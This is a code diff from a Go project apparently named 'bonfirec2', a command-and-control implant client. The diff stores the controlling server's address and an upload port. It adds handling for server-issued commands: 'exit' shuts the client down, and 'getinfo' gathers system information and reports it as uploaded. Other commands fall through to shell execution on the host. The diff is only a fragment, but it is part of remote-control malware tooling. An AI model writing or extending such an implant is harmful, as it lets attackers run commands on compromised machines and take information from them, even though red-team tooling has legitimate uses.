@@ -17,7 +17,12 @@ import (
 	"github.com/Jojojojodr/bonfirec2/pkg/commands"
 )
 
-var input = make(chan string)
+var (
+	input         = make(chan string)
+	serverAddress string
+	serverPort    string
+	apiPort       string
+)
 
 type Client struct {
 	Port      string
@@ -153,7 +158,11 @@ func (c *Client) handleMessageSend(readErr <-chan error) error {
 	}
 }
 
-func NewClient(port string, address string, localPort string) *Client {
+func NewClient(port string, address string, localPort string, uploadPort string) *Client {
+	serverAddress = address
+	serverPort = port
+	apiPort = uploadPort
+
 	return &Client{
 		Port:      port,
 		Address:   address,
@@ -187,6 +196,15 @@ func handleServerCommand(incoming string) (string, bool) {
 
 func executeCommand(command string) string {
 	resolved := commands.GetCommand(command)
+
+	switch resolved {
+	case "exit":
+		log.Println("Exiting...")
+		os.Exit(0)
+	case "getinfo":
+		GetSystemInfo()
+		return "System information uploaded."
+	}
 
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
